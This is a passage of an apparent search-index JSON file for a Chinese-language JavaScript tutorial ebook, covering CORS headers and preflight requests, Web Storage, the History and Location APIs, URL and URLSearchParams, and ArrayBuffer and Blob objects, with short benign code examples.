\u5fc5\u9009\u53c2\u6570\uff0c\u8fd4\u56de\u503c\u662forigin\u7684\u53c2\u6570\uff0c\u6216\u8005\u662f*\uff0c\u8868\u793a\u63a5\u53d7\u4efb\u610f\u57df\u540d\u7684\u8bf7\u6c42\nAccess-Control-Allow-Credentials: true // \u53ef\u9009\u53c2\u6570\uff1a\u8fd9\u4e2a\u503c\u8868\u793a\u662f\u5426\u53d1\u9001cookie\uff0c\u53ea\u80fd\u8bbe\u7f6e\u4e3atrue\uff0c\u4e0d\u8bbe\u7f6e\u5c31\u8868\u793afalse\uff08\u9ed8\u8ba4\u6d4f\u89c8\u5668cookie\u4e0d\u5305\u62ec\u5728CORS\u8bf7\u6c42\u4e2d\uff09\nAccess-Control-Expose-Headers: FooBar // \u53ef\u9009\u53c2\u6570\uff1aJS\u811a\u672c\u9ed8\u8ba4\u53ef\u4ee5\u83b7\u53d6\u90e8\u5206\u54cd\u5e94\u5934\u4fe1\u606f\uff0c\u8fd9\u91cc\u52a0\u4e0a\u8fd9\u4e2a\u5c5e\u6027\uff0c\u8868\u793a\u53ef\u4ee5\u83b7\u53d6\u8fd9\u4e2a\u4fe1\u606f\uff1agetResponseHeader('FooBar') \nContent-Type: text/html; charset=utf-8\n</code></pre> <p>\u9ed8\u8ba4CORS\u8bf7\u6c42\u4e0d\u5305\u542b cookie\uff0c\u4e3a\u4e86\u907f\u514dCSRF\u98ce\u9669\u3002\u5982\u679c\u9700\u8981\u53d1\u9001cookie\uff0c\u524d\u7aef\u9700\u8981\u8bbe\u7f6e xhr.withCredentials = true; \u670d\u52a1\u5668\u4f1a\u8fd4\u56de Access-Control-Allow-Credentials: true\uff0c\u5b9e\u73b0\u8de8\u57df\u3002</p> <p>\u5982\u679c\u670d\u52a1\u5668\u8981\u6c42\u6d4f\u89c8\u5668\u53d1\u9001 Cookie\uff0c<code>Access-Control-Allow-Origin</code>\u5c31\u4e0d\u80fd\u8bbe\u4e3a\u661f\u53f7\uff0c\u5fc5\u987b\u6307\u5b9a\u660e\u786e\u7684\u3001\u4e0e\u8bf7\u6c42\u7f51\u9875\u4e00\u81f4\u7684\u57df\u540d\u3002</p>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#_2","title":"\u975e\u7b80\u5355\u8bf7\u6c42","text":"<p>\u975e\u7b80\u5355\u8bf7\u6c42\uff1a\u8bf7\u6c42\u7684\u65b9\u6cd5\u7279\u6b8a\uff08PUT DELETE\uff09\u8bf7\u6c42\u5934\u7684\u5b57\u6bb5\u7279\u6b8a\uff08Content-Type: 'application/json'\uff09</p> <p>\u7b2c\u4e00\u6b65 \u9884\u68c0\u8bf7\u6c42\uff08preflight\uff09</p> <p>\u5728\u901a\u4fe1\u5f00\u59cb\u524d\uff0c\u53d1\u9001\u4e00\u4e2a\u9884\u68c0\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u8be2\u95ee\u670d\u52a1\u5668\u5f53\u524d\u7f51\u9875\u6240\u5728\u57df\u540d\u662f\u5426\u5728\u670d\u52a1\u5668\u7684\u8bb8\u53ef\u5217\u8868\u4e2d\uff0c\u54ea\u4e9b\u8bf7\u6c42\u65b9\u6cd5\u548c\u8bf7\u6c42\u5934\u5b57\u6bb5\u662f\u5141\u8bb8\u7684\u3002\u670d\u52a1\u5668\u54cd\u5e94\u540c\u610f\u540e\uff0c\u6d4f\u89c8\u5668\u53ef\u4ee5\u7ee7\u7eed\u53d1\u9001\u8bf7\u6c42\u3002\u5982\u679c\u4e0d\u540c\u610f\u5c31\u4e0d\u80fd\u53d1\u9001\uff1b\u8fd9\u6837\u907f\u514d\u4e86\u670d\u52a1\u5668\u6536\u5230\u5927\u91cf\u8de8\u57df\u7684PUT delete\u8bf7\u6c42\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u9884\u68c0\u8bf7\u6c42\u7684\u8bf7\u6c42\u5934\uff1a</p> <pre><code>OPTIONS /cors HTTP/1.1 \u9884\u68c0\u8bf7\u6c42\u7684\u65b9\u6cd5\u662f OPTIONS\nOrigin: http://api.bob.com \u6e90\u662f\u7f51\u9875\u7684\u7f51\u5740\nAccess-Control-Request-Method: PUT \u8fd9\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\u8bf7\u6c42\u65b9\u6cd5\nAccess-Control-Request-Headers: X-Custom-Header \u8fd9\u91cc\u662f\u81ea\u5b9a\u4e49\u7684\u8bf7\u6c42\u5934\u5b57\u6bb5\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n</code></pre> <p>\u7b2c\u4e8c\u6b65 \u670d\u52a1\u5668\u54cd\u5e94</p> <p>\u670d\u52a1\u5668\u6536\u5230\u9884\u68c0\u8bf7\u6c42\uff0c\u5141\u8bb8\u8de8\u57df\uff0c\u505a\u51fa\u56de\u5e94\uff0c\u54cd\u5e94\u5934\u5982\u4e0b</p> <pre><code>HTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 01:15:39 GMT\nServer: Apache/2.0.61 (Unix)\nAccess-Control-Allow-Origin: http://api.bob.com \u8fd9\u91cc\u8868\u793a\u5f53\u524d\u7f51\u9875\u53ef\u4ee5\u8de8\u57df\nAccess-Control-Allow-Methods: GET, POST, PUT \u8fd9\u91cc\u662f\u53ef\u4ee5\u8de8\u57df\u7684\u65b9\u6cd5\nAccess-Control-Allow-Headers: X-Custom-Header\nContent-Type: text/html; charset=utf-8\nContent-Encoding: gzip\nContent-Length: 0\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nContent-Type: text/plain\n</code></pre> <p>\u5982\u679c\u4e0d\u5141\u8bb8\u8de8\u57df\uff0conerror \u4f1a\u6355\u83b7\u9519\u8bef</p> <pre><code>XMLHttpRequest cannot load http://api.alice.com.\nOrigin http://api.bob.com is not allowed by Access-Control-Allow-Origin.\n</code></pre> <p>\u7b2c\u4e09\u6b65 \u6d4f\u89c8\u5668\u6b63\u5e38\u7684\u8bf7\u6c42</p> <p>\u6d4f\u89c8\u5668\u81ea\u52a8\u6dfb\u52a0Origin\u5b57\u6bb5\uff0c\u53d1\u9001\u6b63\u5e38\u7684\u8bf7\u6c42</p>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#109-storage","title":"10.9 Storage","text":"<p>Storage API \u7684\u5b9e\u4f8b\u5bf9\u8c61\u6709\u4e24\u4e2a\uff1awindow.localStorage and window.sessionStorage\u3002\u4ed6\u4eec\u7684\u533a\u522b\u662f\uff0c\u5173\u95ed\u5f53\u524d\u7a97\u53e3\uff08\u5bf9\u8bdd\uff09\u540e\u5b58\u50a8\u662f\u5426\u7ee7\u7eed\u4fdd\u7559\u3002\u4fdd\u5b58\u7684\u6570\u636e\u4ee5\u952e\u503c\u5bf9\u4fdd\u5b58\uff0c\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u6570\u503c\u53c2\u6570\u4f1a\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\u5b58\u50a8\uff09\u3002\u6bcf\u4e2a\u57df\u540d\u7684\u5b58\u50a8\u4e0d\u540c\uff0c\u6700\u5c0f\u7684chrome\u662f2.5MB\uff0c\u4e5f\u53d7\u540c\u57df\u9650\u5236\uff0c\u8de8\u57df\u64cd\u4f5c\u4f1a\u62a5\u9519\u3002</p> <p>\u5c5e\u6027\u548c\u65b9\u6cd5</p> <pre><code>1\u3001window.localStorage.length\n\n2\u3001window.localStorage.setItem('key', 'value'); // \u8fd9\u91cc\u8bbe\u7f6e\u7684key-value\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u5176\u4ed6\u6570\u636e\u7c7b\u578b\u4f1a\u5f3a\u5236\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\uff0c\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002\u5982\u679c\u5b58\u50a8\u6ee1\u4e86\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u62a5\u9519\u3002\u6216\u8005\u76f4\u63a5\u6539\u53d8\u5c5e\u6027\u4e5f\u53ef\u4ee5\u3002\u5982\u679c\u5df2\u6709\u8fd9\u4e2akey, \u91cd\u65b0\u8bbe\u7f6e\u4f1a\u8986\u76d6\u539f\u59cb\u503c\u3002\nwindow.localStorage['key'] = value;\n\n3\u3001window.sessionStorage.getItem('foo') \u5982\u679c\u4e0d\u5b58\u5728\u5c31\u8fd4\u56de null\n\n4\u3001window.sessionStorage.removeItem('foo') \u5982\u679ckey\u4e0d\u5b58\u5728\uff0c\u65b9\u6cd5\u4e0d\u4f1a\u62a5\u9519\uff1b\n5\u3001window.sessionStorage.clear(); // return undefined\n6\u3001window.sessionStorage.key \u8fd4\u56de\u4e00\u4e2akey\u7684\u4f2a\u6570\u7ec4\uff0c\u7ed3\u5408length\u53ef\u4ee5\u904d\u5386\uff1b\n</code></pre> <p>\u5b58\u50a8\u4e8b\u4ef6\uff1a\u5f53\u5b58\u50a8\u5185\u5bb9\u53d8\u5316\u65f6\uff0c\u4f1a\u89e6\u53d1storage\u4e8b\u4ef6\u3002\u8fd9\u4e2a\u4e8b\u4ef6\u5f88\u7279\u6b8a\uff1a\u5982\u679c\u4e00\u4e2a\u7a97\u53e3\u5b58\u50a8\u53d8\u5316\uff0c\u90a3\u4e48\u5f53\u524d\u7a97\u53e3\u4e0d\u4f1a\u89e6\u53d1\uff0c\u540c\u4e00\u4e2a\u57df\u540d\u7684\u5176\u4ed6\u7a97\u53e3\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff08\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u5c5e\u6027\u8fdb\u884c\u4e0d\u540c\u7a97\u53e3\u7684\u901a\u4fe1\uff09</p> <pre><code>window.addEventListener('storage', onChange);\n\nonChange = (e) =&gt; {\n  console.log(e.key); \u8868\u793a\u53d8\u52a8\u7684\u952e\u540d\uff08\u5982\u679c\u662fclear\u4e8b\u4ef6\u8fd4\u56denull\uff09\n  e.newValue\n  e.oldValue\n  e.url\n  e.storageArea\n}\n</code></pre> <p>localStorage \u7684\u53ef\u4ee5\u53c2\u8003\u81ea\u5df1\u603b\u7ed3\u7684\u535a\u5ba2\u3002</p> <p>https://blog.csdn.net/weixin_41697143/article/details/98479748</p>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#109-history","title":"10.9 History","text":"<p>\u6d4f\u89c8\u5668\u7684\u5386\u53f2\u5bf9\u8c61\u3002JS\u811a\u672c\u4e0d\u5141\u8bb8\u83b7\u53d6\u5386\u53f2\u5730\u5740\uff0c\u4f46\u662f\u53ef\u4ee5\u8df3\u8f6c\u5bfc\u822a\u3002\u5bf9\u5386\u53f2\u5bf9\u8c61\u7684\u64cd\u4f5c\uff0c\u548c\u6d4f\u89c8\u5668\u7684\u524d\u8fdb\u540e\u9000\u6309\u94ae\u76f8\u540c\u3002</p> <p>\u5c5e\u6027\uff1ahistory.length \u5f53\u524d\u5386\u53f2\u7684\u6761\u6570\uff1bhistory.state \u5386\u53f2\u5806\u6808\u9876\u5c42\u7684\u5c5e\u6027\uff08\u9ed8\u8ba4undefined\uff09</p> <p>\u65b9\u6cd5\uff1a</p> <ul> <li>history.back(); history.forward(); \u8fd9\u91cc\u4f1a\u4ece\u7f13\u5b58\u4e2d\u52a0\u8f7d\u9875\u9762\u3002</li> <li>history.go(0) \u9ed8\u8ba4\u662f0\uff0c\u8868\u793a\u5237\u65b0\u754c\u9762\uff1b\u4f7f\u7528\u52a0\u51cf1\u8868\u793a\u7f51\u9875\u524d\u8fdb\u540e\u9000\u3002</li> <li>History.pushState(state, title, url) state \u8868\u793a\u72b6\u6001\u5bf9\u8c61\uff0c\u5f53popstate\u4e8b\u4ef6\u89e6\u53d1\u540e\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u4f1a\u4f20\u5165\u56de\u8c03\u51fd\u6570\u3002title \u8868\u793a\u65b0\u9875\u9762\u6807\u9898\uff0curl \u8868\u793a\u65b0\u7684\u7f51\u5740\u3002\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u628a\u5f53\u524d\u7684\u5730\u5740\u6539\u6210URL\uff0chistory\u4e2d\u4f1a\u589e\u52a0\u4e00\u4e2a\u5386\u53f2\u4fe1\u606f\uff0c\u4f46\u662f\u754c\u9762\u4e0d\u4f1a\u8df3\u8f6c\uff08\u4e0d\u4f1a\u5237\u65b0\uff09\u8fd9\u4e2a\u7f51\u5740\u4e0d\u80fd\u8de8\u57df\uff0c\u5426\u5219\u62a5\u9519\u3002</li> <li>History.replaceState(state, title, url) \u66ff\u6362\u5f53\u524d\u7684\u5386\u53f2\u8bb0\u5f55\u4e3a\u65b0\u7684URL\uff08\u539f\u59cb\u5386\u53f2\u88ab\u66ff\u6362\uff09</li> </ul> <p>\u4e8b\u4ef6\uff1apopstate</p> <p>\u5f53history\u5bf9\u8c61\u53d8\u5316\u65f6\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff1apushState() and replaceState() \u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u5176\u4ed6\u4e09\u4e2a\u4e8b\u4ef6\u6216\u8005\u70b9\u51fb\u524d\u8fdb\u540e\u9000\u6309\u94ae\u5c31\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u53ef\u4ee5\u7ed9\u8fd9\u4e2a\u4e8b\u4ef6\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u3002\u6ce8\u610f\uff0c\u9875\u9762\u7b2c\u4e00\u6b21\u52a0\u8f7d\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u4e0d\u4f1a\u89e6\u53d1<code>popstate</code>\u4e8b\u4ef6\u3002</p>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#1010-location-url-urlsearchparems","title":"10.10 Location, URL, URLSearchParems \u5bf9\u8c61","text":""},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#location","title":"Location","text":"<p>Location \u5bf9\u8c61\u53ef\u4ee5\u64cd\u4f5c URL\uff0c\u4f7f\u7528 window.location or document.location \u53ef\u4ee5\u83b7\u53d6Location\u5bf9\u8c61\u3002\u4e0b\u9762\u662f\u5e38\u7528\u7684\u5c5e\u6027\uff1a</p> <pre><code>location.href \u6574\u4e2aURL \uff08\u5982\u679c\u66f4\u6539\uff0c\u6d4f\u89c8\u5668\u4f1a\u7acb\u523b\u8df3\u8f6c\u5230\u65b0\u5730\u5740\uff0c\u5373\u4f7fURL\u4e0e\u539f\u59cb\u76f8\u540c\uff0c\u754c\u9762\u4ecd\u7136\u4f1a\u5237\u65b0\uff09\nlocation.origin \u534f\u8bae\u3001\u4e3b\u673a\u540d\u3001\u7aef\u53e3 http://www.baidu.com:8080(\u8fd9\u662f\u53ea\u8bfb\u5c5e\u6027)\nlocation.protocol \u534f\u8bae\uff08\u5305\u62ec\u5192\u53f7\uff09 http:\nlocation.host \u4e3b\u673a\u540d\u548c\u7aef\u53e3\u53f7 www.baidu.com:8080(\u9ed8\u8ba480and443\u7aef\u53e3\u4f1a\u7701\u7565)\nhostname \u4e3b\u673a\u540d\nport \u7aef\u53e3\u53f7\n\npathname \u8def\u5f84\uff1a\u4ece\u6839\u8def\u5f84\u5f00\u59cb\uff08\u5305\u62ec\u6839\u8def\u5f84\uff09\nsearch \u67e5\u8be2\u90e8\u5206\uff1a\u95ee\u53f7\u5f00\u59cb\uff08\u4e0d\u5305\u62ec\u95ee\u53f7\uff09\nhash \u54c8\u5e0c\u90e8\u5206\uff1a\u4e95\u53f7\u5f00\u59cb\uff08\u4e0d\u5305\u62ec#\uff09\nusername\npassword \u57df\u540d\u524d\u9762\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801 \u6d4b\u8bd5\u662fundefined\n</code></pre> <p>\u66f4\u6539 location.href \u53ef\u4ee5\u53d8\u6210\u65b0\u7684\u951a\u70b9('#comment')\u3002<code>Location.href</code>\u5c5e\u6027\u662f\u6d4f\u89c8\u5668\u552f\u4e00\u5141\u8bb8\u8de8\u57df\u5199\u5165\u7684\u5c5e\u6027\uff0c\u5373\u975e\u540c\u6e90\u7684\u7a97\u53e3\u53ef\u4ee5\u6539\u5199\u53e6\u4e00\u4e2a\u7a97\u53e3\uff08\u6bd4\u5982\u5b50\u7a97\u53e3\u4e0e\u7236\u7a97\u53e3\uff09\u7684<code>Location.href</code>\u5c5e\u6027\uff0c\u5bfc\u81f4\u540e\u8005\u7684\u7f51\u5740\u8df3\u8f6c\u3002<code>Location</code>\u7684\u5176\u4ed6\u5c5e\u6027\u90fd\u4e0d\u5141\u8bb8\u8de8\u57df\u5199\u5165\u3002</p> <p>\u65b9\u6cd5\uff1a</p> <ul> <li>location.assign(newURL) \u6d4f\u89c8\u5668\u7acb\u523b\u8df3\u8f6c\u5230\u65b0\u7684URL\uff0c\u5982\u679c\u4e0d\u662fURL\u4f1a\u62a5\u9519</li> <li>location.replace(newURL) \u76f4\u63a5\u8df3\u8f6c\u5230\u65b0\u7684\u7f51\u9875\uff0c\u5f53\u524d\u7684\u5386\u53f2\u4e0d\u4f1a\u4fdd\u5b58\uff08\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u662f\u79fb\u52a8\u7aef\uff0c\u7136\u540e\u754c\u9762\u8fdb\u884c\u8df3\u8f6c\uff09\uff1b</li> <li>location.reload(true) \u91cd\u8f7d\u5f53\u524d\u7a97\u53e3\uff08\u5237\u65b0\u754c\u9762\uff09\u5982\u679c\u4f20\u5165true\uff0c\u8868\u793a\u60f3\u670d\u52a1\u5668\u91cd\u65b0\u8bf7\u6c42\uff0c\u8bf7\u6c42\u65b0\u754c\u9762\u4e0d\u6eda\u52a8\uff1b\u5982\u679c\u662ffalse\u6216\u8005\u9ed8\u8ba4\u4e0d\u4f20\u503c\uff0c\u76f4\u63a5\u4ece\u7f13\u5b58\u4e2d\u52a0\u8f7d\uff0c\u754c\u9762\u505c\u7559\u5728\u5f53\u524d\u6eda\u52a8\u7684\u4f4d\u7f6e\u3002</li> <li>location.toString() \u7b49\u4ef7\u4e8e let a = location.href;</li> </ul>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#url","title":"URL","text":""},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#1url","title":"1\u3001URL\u7684\u7f16\u7801\u548c\u89e3\u7801","text":"<p>URL\u4e2d\u7684\u6c49\u5b57\u548c\u7279\u6b8a\u5b57\u7b26\u9700\u8981\u8f6c\u7801\u6210\u4e3aUTF-8\u7f16\u7801\uff08\u4f8b\u5982%82\uff09\u8bf7\u6c42\u4e2d\u8def\u5f84\u6587\u4ef6\u540d\u9700\u8981\u8f6c\u7801</p> <ul> <li>encodeURI('http://www.example.com/q=\u6625\u8282') \uff08\u6ce8\u610f\u662fURI\uff0c\u4e0d\u662fURL\uff09\u4f20\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4f1a\u5c06\u5143\u5b57\u7b26\uff08\u5192\u53f7\u659c\u6760\uff09\u548c\u8bed\u4e49\u5b57\u7b26\u4e4b\u5916\u7684\u5b57\u7b26\uff0c\u90fd\u8fdb\u884c\u8f6c\u4e49\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u5b8c\u6574\u7684URL</li> <li>encodeURIComponent\uff08filepath + name\uff09\u4f1a\u8f6c\u7801\u9664\u4e86\u8bed\u4e49\u5b57\u7b26\u4e4b\u5916\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5373\u5143\u5b57\u7b26\u4e5f\u4f1a\u88ab\u8f6c\u7801\u3002\u5982\u679c\u659c\u6760\u548c\u5192\u53f7\u88ab\u8f6c\u4e49\u5c31\u4f1a\u51fa\u9519\u3002</li> <li>decodeURI</li> <li>decodeURIComponent \u662f\u4e0a\u9762\u4e24\u4e2a\u65b9\u6cd5\u7684\u9006\u8fd0\u7b97</li> </ul>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#2url","title":"2\u3001URL\u5bf9\u8c61","text":"<p>URL\u5bf9\u8c61\u662f\u4e00\u4e2a\u539f\u751f\u5bf9\u8c61\uff0ca\u6807\u7b7e\u7ee7\u627f\u4e86URL\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff08href\uff09</p> <pre><code>var url = new URL('http://www.example.com/index.html');\nconsole.log(url.href);\n\u5982\u679c\u53c2\u6570\u662f\u53e6\u4e00\u4e2a URL \u5b9e\u4f8b\uff0c\u6784\u9020\u51fd\u6570\u4f1a\u81ea\u52a8\u8bfb\u53d6\u8be5\u5b9e\u4f8b\u7684href\u5c5e\u6027\uff0c\u4f5c\u4e3a\u5b9e\u9645\u53c2\u6570\u3002\u5982\u679c URL \u5b57\u7b26\u4e32\u662f\u4e00\u4e2a\u76f8\u5bf9\u8def\u5f84\uff0c\u90a3\u4e48\u9700\u8981\u8868\u793a\u7edd\u5bf9\u8def\u5f84\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4f5c\u4e3a\u8ba1\u7b97\u57fa\u51c6\u3002\nvar url2 = new URL('page2.html', 'http://example.com/page1.html');\n// \"http://example.com/page2.html\"\n</code></pre> <p>\u5c5e\u6027\uff1aURL\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5c5e\u6027\u548cLocation\u7684\u5c5e\u6027\u57fa\u672c\u4e00\u81f4\uff08origin\u53ea\u8bfb\uff0c\u5176\u4ed6\u90fd\u53ef\u4ee5\u4fee\u6539\uff09</p> <p>\u65b9\u6cd5</p> <ul> <li>URL.createObjectURL()\u4e3a\u4e0a\u4f20/\u4e0b\u8f7d\u7684\u6587\u4ef6\u3001\u6d41\u5a92\u4f53\u6587\u4ef6\u751f\u6210\u4e00\u4e2a URL \u5b57\u7b26\u4e32\u3002\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4ee3\u8868\u4e86<code>File</code>\u5bf9\u8c61\u6216<code>Blob</code>\u5bf9\u8c61\u7684 URL\u3002</li> <li>URL.revokeObjectURL()\u7528\u6765\u91ca\u653e<code>URL.createObjectURL</code>\u65b9\u6cd5\u751f\u6210\u7684 URL \u5b9e\u4f8b\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f<code>URL.createObjectURL</code>\u65b9\u6cd5\u8fd4\u56de\u7684 URL \u5b57\u7b26\u4e32\u3002</li> </ul>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#3urlsearchparams","title":"3\u3001URLSearchParams","text":"<p>URLSearchParams \u7528\u6765\u6784\u9020\u3001\u89e3\u6790\u3001\u5904\u7406 URL \u67e5\u8be2\u90e8\u5206\uff08\uff1f\u540e\u9762\u7684\u90e8\u5206\uff09\u53c2\u6570\u53ef\u4ee5\u4f7f\u5b57\u7b26\u4e32\u5bf9\u8c61\u6570\u7ec4\uff0c\u4f1a\u5bf9\u67e5\u8be2\u5b57\u7b26\u4e32\u81ea\u52a8\u7f16\u7801\uff08encode\uff09\u3002</p> <pre><code>// \u65b9\u6cd5\u4e00\uff1a\u4f20\u5165\u5b57\u7b26\u4e32\nvar params = new URLSearchParams('?foo=1&amp;bar=2');\n// \u65b9\u6cd5\u4e8c\uff1a\u4f20\u5165\u6570\u7ec4\nvar params = new URLSearchParams([['foo', 1], ['bar', 2]]);\n// \u65b9\u6cd5\u4e09\uff1a\u4f20\u5165\u5bf9\u8c61\nvar params = new URLSearchParams({'foo' : 1 , 'bar' : 2});\n</code></pre> <p>\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u53d1\u9001\u8868\u5355\u6570\u636e\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528<code>URLSearchParams</code>\u5b9e\u4f8b\u4f5c\u4e3a\u8868\u5355\u6570\u636e\uff08POS\u8bf7\u6c42\u7684\u6570\u636e\uff09\u3002</p> <pre><code>fetch('https://example.com/api', {\n  method: 'POST',\n  body: params\n}).then(...)\n\nvar params = new URLSearchParams({version: 2.0});\nwindow.location.href = location.pathname + '?' + params;\n</code></pre> <ul> <li>URLSearchParams.toString() \u628a\u5b9e\u4f8b\u5bf9\u8c61\u8f6c\u5316\u6210\u5b57\u7b26\u4e32</li> <li>URLSearchParams.append('baz', 3) \u8ffd\u52a0\u4e00\u4e2a\u67e5\u8be2\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u4e3a\u952e\u540d\uff0c\u7b2c\u4e8c\u4e2a\u4e3a\u952e\u503c\uff0c\u6ca1\u6709\u8fd4\u56de\u503c\u3002</li> <li>URLSearchParams.delete() \u5220\u9664\u4e00\u4e2a\u67e5\u8be2\u53c2\u6570\u3002</li> <li>URLSearchParams.has() \u67e5\u8be2\u4e00\u4e2a\u53c2\u6570 \u8fd4\u56de\u5e03\u5c14\u503c</li> <li>URLSearchParams.set('foo', 5) \u8bbe\u7f6e\u4e00\u4e2a\u67e5\u8be2\u53c2\u6570\uff1b\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u53c2\u6570\u5c31\u589e\u52a0</li> <li>URLSearchParams.get() \u83b7\u53d6\u67d0\u4e2avalue</li> <li>URLSearchParams.getAll() \u8fd4\u56de\u5168\u90e8\u7684value\u6570\u7ec4</li> <li>URLSearchParams.sort()  \u6309\u7167Unicode\u8fdb\u884c\u6392\u5e8f</li> <li>URLSearchParams.keys()\u3001URLSearchParams.values()\u3001URLSearchParams.entries() \u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u8ba9for...of... \u5faa\u73af\u904d\u5386\u3002<code>keys</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u952e\u540d\u7684\u904d\u5386\u5668\uff0c<code>values</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u952e\u503c\u7684\u904d\u5386\u5668\uff0c<code>entries</code>\u8fd4\u56de\u7684\u662f\u952e\u503c\u5bf9\u7684\u904d\u5386\u5668\u3002</li> </ul>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#1011-arraybuffer-blob","title":"10.11 ArrayBuffer, Blob","text":""},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#arraybuffer","title":"ArrayBuffer \u5bf9\u8c61","text":"<p>\u53ef\u4ee5\u83b7\u53d6\u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e\uff08\u64cd\u4f5c\u5185\u5b58\uff09\uff0c\u4e3b\u8981\u5728ES6\u4e2d\u4ecb\u7ecd\u3002</p> <pre><code>let buffer = new ArrayBuffer(8); // \u6784\u9020\u51fd\u6570\u521b\u5efa\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8868\u793a\u8fd9\u6bb5\u4e8c\u8fdb\u5236\u6570\u636e\u5360\u7528\u591a\u5c11\u4e2a\u5b57\u8282\nbuffer.byteLength; \u5f53\u524d\u5bf9\u8c61\u5360\u7528\u7684\u5185\u5b58\u957f\u5ea6\nlet buffer2 = buffer.slice(0,4); \u590d\u5236\u4e00\u90e8\u5206\u5185\u5b58\n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#blob","title":"Blob \u5bf9\u8c61","text":"<p>\u8868\u793a\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6570\u636e\u5185\u5bb9\uff08\u56fe\u7247\uff09Binary Large Object \u4e8c\u8fdb\u5236\u5927\u578b\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u6765\u64cd\u4f5c\u4e8c\u8fdb\u5236\u6587\u4ef6</p> <pre><code>\u6784\u9020\u51fd\u6570\nlet blob = newBlob([array], options);\n// \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e8c\u8fdb\u5236\u6570\u7ec4\uff0c\u6570\u7ec4\u6210\u5458\u662f\u4e8c\u8fdb\u5236\u6570\u636e\u6216\u8005\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u53ef\u9009\u53c2\u6570\u662f\u914d\u7f6e\uff0ctype\uff0c\u8868\u793a\u6570\u636e\u7c7b\u578b\n\nlet htmlFragment = ['&lt;span&gt;Michael&lt;/span&gt;'];\nlet blob = new Blob(htmlFragemtn, {\n  type: 'text/html'\n});\n\nlet obj = { foo: 'foo' };\nlet blob2 = new Blob([JSON.stringify(obj)], {\n  type: 'application/json'\n});\n\n\u5c5e\u6027\u548c\u65b9\u6cd5\nsize \u8fd4\u56de\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u957f\u5ea6\ntype \u8fd4\u56de\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u7c7b\u578b \nblob.slice(start, end, type) \u622a\u53d6\u4e00\u90e8\u5206\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08\u53ef\u4ee5\u8bbe\u7f6e\u7c7b\u578b\uff09\n</code></pre> <p>\u4e0b\u9762\u4f7f\u7528Blob\u8bfb\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6</p>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#_3","title":"\u83b7\u53d6\u6587\u4ef6","text":"<p>input type=file 